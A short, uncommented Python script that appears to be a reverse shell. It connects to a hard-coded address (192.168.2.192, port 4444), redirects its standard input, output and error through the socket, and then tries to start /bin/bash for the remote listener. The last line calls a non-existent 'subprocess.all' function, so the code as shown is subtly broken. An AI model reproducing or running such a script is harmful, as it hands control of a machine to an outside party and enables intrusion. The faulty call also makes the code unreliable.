
import socket, subprocess, os
host = "192.168.2.192"
port = 4444
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
s.connect((host, port))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p = subprocess.all("/bin/bash")